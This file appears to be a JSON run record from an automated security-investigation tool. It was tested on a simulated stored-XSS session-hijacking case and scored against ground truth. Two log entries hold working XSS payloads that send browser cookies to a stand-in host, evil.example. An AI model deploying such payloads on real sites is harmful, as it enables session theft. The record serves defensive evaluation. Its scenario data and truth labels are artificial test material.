@@ -1,0 +1,710 @@
+{
+  "case_id": "CHAIN-CASE-04",
+  "run": {
+    "run_id": "20261116T154124Z",
+    "started_at": "2026-11-16T15:41:24.692462+00:00",
+    "finished_at": "2026-11-16T15:41:24.694455+00:00",
+    "duration_ms": 1,
+    "controller": "rule_based_v1_controller",
+    "env": {
+      "data_source_mode": "dataset_replay",
+      "search_mode": "auto"
+    },
+    "code_version": {
+      "commit": "e581305",
+      "branch": "feature/w2-account-scope-v1-traces",
+      "dirty_worktree": true
+    },
+    "dataset": "data/full_chain_logs",
+    "data_source": "dataset_replay",
+    "rounds": 3,
+    "seed": {
+      "case_id": "CHAIN-CASE-04",
+      "trace_id": "CHAIN-CASE-04"
+    },
+    "step_status_counts": {
+      "ok": 2,
+      "empty": 0,
+      "error": 1
+    }
+  },
+  "trace": {
+    "steps": [
+      {
+        "round": 1,
+        "tool": "query_logs",
+        "args": {
+          "case_id": "CHAIN-CASE-04",
+          "trace_id": "CHAIN-CASE-04",
+          "limit": 50
+        },
+        "why": "以线索 trace_id 拉取同一攻击故事链的全阶段日志",
+        "data_source": "dataset_replay",
+        "returned_log_ids": [
+          "LOG-20261103-0401",
+          "LOG-20261103-0402",
+          "LOG-20261103-0403",
+          "LOG-20261103-0404",
+          "LOG-20261103-0405",
+          "LOG-20261103-0406",
+          "LOG-20261103-0407",
+          "LOG-20261103-0408",
+          "LOG-20261103-0409",
+          "LOG-20261103-0410",
+          "LOG-20261103-0411",
+          "LOG-20261103-0412",
+          "LOG-20261103-0413",
+          "LOG-20261103-0414",
+          "LOG-20261103-0415",
+          "LOG-20261103-0416",
+          "LOG-20261103-0417",
+          "LOG-20261103-0418",
+          "LOG-20261103-0419"
+        ],
+        "status": "ok",
+        "total": 19,
+        "response": {
+          "meta": {
+            "reference_time": "2026-11-03T09:24:00+00:00",
+            "total": 19,
+            "data_source": "dataset_replay",
+            "mock": false,
+            "backend_available": true,
+            "dataset": "data/full_chain_logs",
+            "time_base": "scenario_latest",
+            "time_window_applied": "1h",
+            "scenarios": [
+              "CHAIN-CASE-04"
+            ],
+            "scenario_time_bases": [
+              {
+                "trace_id": "CHAIN-CASE-04",
+                "reference_time": "2026-11-03T09:24:00+00:00",
+                "window_start": "2026-11-03T08:24:00+00:00",
+                "window_end": "2026-11-03T09:24:00+00:00",
+                "matched": 19
+              }
+            ],
+            "notes": []
+          },
+          "items": [
+            {
+              "log_id": "LOG-20261103-0401",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:12:03Z",
+              "log_source": "nginx_access",
+              "src_ip": "10.0.0.45",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": null,
+              "session_id": null,
+              "bytes_out": 22010,
+              "action_or_method": "GET",
+              "uri_or_target": "/product/1001",
+              "payload_summary": null,
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+              "attack_stage_hint": "benign"
+            },
+            {
+              "log_id": "LOG-20261103-0402",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:13:10Z",
+              "log_source": "nginx_access",
+              "src_ip": "198.51.100.61",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": null,
+              "session_id": null,
+              "bytes_out": 8120,
+              "action_or_method": "GET",
+              "uri_or_target": "/comment.php?post=88",
+              "payload_summary": null,
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+              "attack_stage_hint": "recon"
+            },
+            {
+              "log_id": "LOG-20261103-0403",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:13:44Z",
+              "log_source": "nginx_access",
+              "src_ip": "198.51.100.61",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": null,
+              "session_id": null,
+              "bytes_out": 5120,
+              "action_or_method": "GET",
+              "uri_or_target": "/feedback.php",
+              "payload_summary": null,
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+              "attack_stage_hint": "recon"
+            },
+            {
+              "log_id": "LOG-20261103-0404",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:14:20Z",
+              "log_source": "nginx_access",
+              "src_ip": "198.51.100.61",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": null,
+              "session_id": null,
+              "bytes_out": 640,
+              "action_or_method": "POST",
+              "uri_or_target": "/comment.php",
+              "payload_summary": "content=<script>new Image().src='//evil.example/c?c='+document.cookie</script>&post=88",
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+              "attack_stage_hint": "exploitation"
+            },
+            {
+              "log_id": "LOG-20261103-0405",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:14:25Z",
+              "log_source": "nginx_access",
+              "src_ip": "198.51.100.61",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": null,
+              "session_id": null,
+              "bytes_out": 512,
+              "action_or_method": "POST",
+              "uri_or_target": "/feedback.php",
+              "payload_summary": "msg=<img src=x onerror=fetch('//evil.example/s?c='+document.cookie)>&uid=",
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+              "attack_stage_hint": "exploitation"
+            },
+            {
+              "log_id": "LOG-20261103-0406",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:15:00Z",
+              "log_source": "nginx_access",
+              "src_ip": "10.0.0.45",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": "ops_li",
+              "session_id": "sess-a91c",
+              "bytes_out": 15320,
+              "action_or_method": "GET",
+              "uri_or_target": "/admin/dashboard.php",
+              "payload_summary": null,
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+              "attack_stage_hint": "benign"
+            },
+            {
+              "log_id": "LOG-20261103-0407",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:16:10Z",
+              "log_source": "nginx_access",
+              "src_ip": "10.0.0.45",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": "ops_li",
+              "session_id": "sess-a91c",
+              "bytes_out": 9120,
+              "action_or_method": "GET",
+              "uri_or_target": "/comment.php?post=88",
+              "payload_summary": null,
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+              "attack_stage_hint": "benign"
+            },
+            {
+              "log_id": "LOG-20261103-0408",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:16:30Z",
+              "log_source": "nginx_access",
+              "src_ip": "10.0.0.45",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": "ops_li",
+              "session_id": "sess-a91c",
+              "bytes_out": 42300,
+              "action_or_method": "GET",
+              "uri_or_target": "/admin/order_list.php",
+              "payload_summary": null,
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+              "attack_stage_hint": "benign"
+            },
+            {
+              "log_id": "LOG-20261103-0409",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:17:00Z",
+              "log_source": "nginx_access",
+              "src_ip": "198.51.100.61",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": "ops_li",
+              "session_id": "sess-a91c",
+              "bytes_out": 15320,
+              "action_or_method": "GET",
+              "uri_or_target": "/admin/dashboard.php",
+              "payload_summary": null,
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+              "attack_stage_hint": "exploitation"
+            },
+            {
+              "log_id": "LOG-20261103-0410",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:17:20Z",
+              "log_source": "nginx_access",
+              "src_ip": "198.51.100.61",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": "ops_li",
+              "session_id": "sess-a91c",
+              "bytes_out": 44100,
+              "action_or_method": "GET",
+              "uri_or_target": "/admin/user_list.php",
+              "payload_summary": null,
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+              "attack_stage_hint": "exploitation"
+            },
+            {
+              "log_id": "LOG-20261103-0411",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:17:40Z",
+              "log_source": "nginx_access",
+              "src_ip": "198.51.100.61",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": "ops_li",
+              "session_id": "sess-a91c",
+              "bytes_out": 88600,
+              "action_or_method": "GET",
+              "uri_or_target": "/admin/export.php?table=users",
+              "payload_summary": null,
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+              "attack_stage_hint": "exploitation"
+            },
+            {
+              "log_id": "LOG-20261103-0412",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:18:10Z",
+              "log_source": "nginx_access",
+              "src_ip": "198.51.100.61",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": "ops_li",
+              "session_id": "sess-a91c",
+              "bytes_out": 3120,
+              "action_or_method": "POST",
+              "uri_or_target": "/admin/user_edit.php",
+              "payload_summary": "id=1002&role=admin",
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+              "attack_stage_hint": "exploitation"
+            },
+            {
+              "log_id": "LOG-20261103-0413",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:18:40Z",
+              "log_source": "zeek_http",
+              "src_ip": "198.51.100.61",
+              "src_port": 51220,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": null,
+              "session_id": null,
+              "bytes_out": 640,
+              "action_or_method": "POST",
+              "uri_or_target": "/comment.php",
+              "payload_summary": null,
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+              "attack_stage_hint": "exploitation"
+            },
+            {
+              "log_id": "LOG-20261103-0414",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:19:00Z",
+              "log_source": "zeek_conn",
+              "src_ip": "198.51.100.61",
+              "src_port": 51344,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": null,
+              "session_id": null,
+              "bytes_out": 12800,
+              "action_or_method": "TCP",
+              "uri_or_target": "10.0.0.15:443",
+              "payload_summary": "conn_state=SF;duration=12.8",
+              "status_code": null,
+              "user_agent": null,
+              "attack_stage_hint": "exploitation"
+            },
+            {
+              "log_id": "LOG-20261103-0415",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:20:15Z",
+              "log_source": "nginx_access",
+              "src_ip": "203.0.113.88",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": null,
+              "session_id": null,
+              "bytes_out": 9120,
+              "action_or_method": "GET",
+              "uri_or_target": "/comment.php?post=88",
+              "payload_summary": null,
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+              "attack_stage_hint": "benign"
+            },
+            {
+              "log_id": "LOG-20261103-0416",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:21:00Z",
+              "log_source": "nginx_access",
+              "src_ip": "10.0.0.44",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": null,
+              "session_id": null,
+              "bytes_out": 88211,
+              "action_or_method": "GET",
+              "uri_or_target": "/static/app.js",
+              "payload_summary": null,
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+              "attack_stage_hint": "benign"
+            },
+            {
+              "log_id": "LOG-20261103-0417",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:22:30Z",
+              "log_source": "nginx_access",
+              "src_ip": "198.51.100.61",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": "ops_li",
+              "session_id": "sess-a91c",
+              "bytes_out": 1620,
+              "action_or_method": "GET",
+              "uri_or_target": "/admin/logout.php",
+              "payload_summary": null,
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+              "attack_stage_hint": "exploitation"
+            },
+            {
+              "log_id": "LOG-20261103-0418",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:23:10Z",
+              "log_source": "nginx_access",
+              "src_ip": "203.0.113.88",
+              "src_port": null,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 443,
+              "asset_id": "web-prod-01",
+              "user": null,
+              "session_id": null,
+              "bytes_out": 5120,
+              "action_or_method": "GET",
+              "uri_or_target": "/",
+              "payload_summary": null,
+              "status_code": 200,
+              "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+              "attack_stage_hint": "benign"
+            },
+            {
+              "log_id": "LOG-20261103-0419",
+              "trace_id": "CHAIN-CASE-04",
+              "timestamp": "2026-11-03T09:24:00Z",
+              "log_source": "auth_log",
+              "src_ip": "10.0.0.45",
+              "src_port": 54880,
+              "dest_ip": "10.0.0.15",
+              "dest_port": 22,
+              "asset_id": "web-prod-01",
+              "user": "ops_li",
+              "session_id": null,
+              "bytes_out": null,
+              "action_or_method": "login_success",
+              "uri_or_target": "sshd",
+              "payload_summary": null,
+              "status_code": null,
+              "user_agent": null,
+              "attack_stage_hint": "benign"
+            }
+          ]
+        }
+      },
+      {
+        "round": 2,
+        "tool": "get_context",
+        "args": {
+          "user": "ops_li",
+          "asset_id": "web-prod-01",
+          "at_time": "2026-11-03T09:22:30Z"
+        },
+        "why": "已见到认证/账号相关行为，需用行为基线与资产重要性区分定向打点与正常运维",
+        "data_source": "asset_context",
+        "returned_log_ids": [],
+        "status": "ok",
+        "total": 2,
+        "response": {
+          "meta": {
+            "reference_time": null,
+            "total": 2,
+            "data_source": "asset_context",
+            "mock": false,
+            "backend_available": true,
+            "dataset": "config",
+            "time_base": null,
+            "time_window_applied": null,
+            "scenarios": [],
+            "scenario_time_bases": [],
+            "notes": []
+          },
+          "user_profile": {
+            "user": "ops_li",
+            "account_type": "legit_operator",
+            "allowlisted": true,
+            "disposition_exempt": true,
+            "matched_rule": "ops_*",
+            "allowlist_reason": "运维账号，允许非常规时间登录",
+            "allowlist_scope": [
+              "isolate_account"
+            ],
+            "common_src_ips": [
+              "10.0.0.0/24",
+              "10.0.0.66",
+              "10.10.0.50"
+            ],
+            "allowed_assets": [
+              "web-prod-01",
+              "backup-01",
+              "nas-host-01"
+            ],
+            "source_scope_provided": true,
+            "asset_scope_provided": true,
+            "authorization_source": "config/response-policy.yaml#allowlist.users",
+            "config_source": "config/response-policy.yaml#allowlist.users"
+          },
+          "asset_context": {
+            "asset_id": "web-prod-01",
+            "hostname": "生产 Web 前端",
+            "ip": "10.0.0.15",
+            "role": "web",
+            "importance": "HIGH",
+            "criticality": "high",
+            "exposed_to_internet": true,
+            "owner": "ops-team",
+            "department": "运维",
+            "services": [
+              "http",
+              "https"
+            ],
+            "log_sources": [
+              "nginx_access",
+              "zeek_http",
+              "zeek_conn"
+            ],
+            "blast_radius": "对外主站，封禁即业务中断",
+            "whitelisted": false,
+            "whitelist_reason": null,
+            "whitelisted_ips": [
+              "10.0.0.40",
+              "127.0.0.1",
+              "10.0.0.77"
+            ],
+            "maintenance_windows": [
+              {
+                "asset_id": "web-prod-01",
+                "days": [
+                  "mon",
+                  "tue",
+                  "wed",
+                  "thu",
+                  "fri",
+                  "sat",
+                  "sun"
+                ],
+                "start": "02:00",
+                "end": "03:30",
+                "activity": "例行发布与备份",
+                "allowed_actions": [
+                  "deploy",
+                  "backup",
+                  "restart"
+                ],
+                "never_exempt": [
+                  "sql_injection",
+                  "malicious_upload",
+                  "webshell_access"
+                ]
+              },
+              {
+                "asset_id": "web-prod-01",
+                "days": [
+                  "thu"
+                ],
+                "start": "14:00",
+                "end": "14:30",
+                "activity": "安全测试组授权漏洞扫描（对应 CHAIN-CASE-09，授权源 IP 10.0.0.77）",
+                "allowed_actions": [
+                  "vuln_scan",
+                  "probe"
+                ],
+                "authorized_src_ips": [
+                  "10.0.0.77"
+                ],
+                "never_exempt": [
+                  "malicious_upload",
+                  "webshell_access"
+                ]
+              }
+            ],
+            "timezone": "Asia/Shanghai",
+            "in_maintenance_window": false,
+            "matched_window": null,
+            "evaluated_at": "2026-11-03T09:22:30Z",
+            "config_source": "config/assets.yaml + maintenance-windows.yaml + response-policy.yaml"
+          }
+        }
+      },
+      {
+        "round": 3,
+        "tool": "search_knowledge",
+        "args": {
+          "query": "跨站脚本利用成功后如何研判与处置，是否需要短时封禁 IP",
+          "limit": 5
+        },
+        "why": "已出现利用/外连阶段，检索知识卡与已确认案例作为处置依据",
+        "data_source": null,
+        "returned_log_ids": [],
+        "status": "error",
+        "error": {
+          "code": "backend_unavailable",
+          "message": "知识检索不可用：导入 src.knowledge.search 失败（通常缺 sentence-transformers / qdrant-client 依赖）",
+          "details": {
+            "backend": "knowledge",
+            "reason": "导入 src.knowledge.search 失败（通常缺 sentence-transformers / qdrant-client 依赖）",
+            "backend_available": false,
+            "error": "ModuleNotFoundError: No module named 'qdrant_client'",
+            "stage": "import"
+          }
+        }
+      }
+    ]
+  },
+  "result": {
+    "case_id": "CHAIN-CASE-04",
+    "is_malicious": true,
+    "attack_type": "XSS",
+    "risk_level": "HIGH",
+    "attacker_ip": "198.51.100.61",
+    "victim_asset": "web-prod-01",
+    "evidence_log_ids": [
+      "LOG-20261103-0404",
+      "LOG-20261103-0405"
+    ],
+    "attack_chain_summary": "攻击源 198.51.100.61 对 web-prod-01 实施：跨站脚本尝试 2 次；攻击请求得到响应（未确认利用成功）。",
+    "recommended_action": "block_ip",
+    "requires_human_approval": true,
+    "unknown_items": "处置建议尚未经过人工审批，未提交处置申请；存在标注为 recon、exploitation 的日志，但缺少对应行为证据，仅作待查线索，未计入结论；知识检索调用失败：知识检索不可用：导入 src.knowledge.search 失败（通常缺 sentence-transformers / qdrant-client 依赖）。"
+  },
+  "conclusion_basis": {
+    "attack_type": {
+      "value": "XSS",
+      "segments": [
+        {
+          "code": "XSS",
+          "log_ids": [
+            "LOG-20261103-0404",
+            "LOG-20261103-0405"
+          ]
+        }
+      ]
+    },
+    "risk_level": {
+      "value": "HIGH",
+      "rule": "强特征请求得到响应（未确认利用成功）",
+      "log_ids": [
+        "LOG-20261103-0404",
+        "LOG-20261103-0405"
+      ]
+    },
+    "attacker_ip": {
+      "value": "198.51.100.61",
+      "log_ids": [
+        "LOG-20261103-0404",
+        "LOG-20261103-0405"
+      ]
+    },
+    "summary": {
+      "text": "攻击源 198.51.100.61 对 web-prod-01 实施：跨站脚本尝试 2 次；攻击请求得到响应（未确认利用成功）。",
+      "stage_counts": {
+        "XSS": 2
+      }
+    }
+  },
+  "context_decision": {},
+  "checks": {
+    "schema_valid": true,
+    "verify_ok": true,
+    "verify_problems": [],
+    "evidence_count": 2,
+    "evidence_all_registered": true,
+    "unregistered_evidence": [],
+    "requires_human_approval": true,
+    "recommended_action": "block_ip"
+  },
+  "evaluation": {
+    "truth_case_id": "CHAIN-CASE-04",
+    "malicious_match": true,
+    "risk_match": true,
+    "truth_attack_type": "Stored_XSS_Session_Hijacking",
+    "normalized_truth_attack_type": "Stored_XSS_Session_Hijacking",
+    "truth_normalization_rule": null,
+    "attack_type_exact_match": false,
+    "attack_type_covers_truth": false,
+    "attacker_ip_match": true,
+    "evidence_recall": 0.333,
+    "evidence_hit": 2,
+    "evidence_truth_total": 6,
+    "note": "仅作独立评测对照，未参与调查过程"
+  }
+}
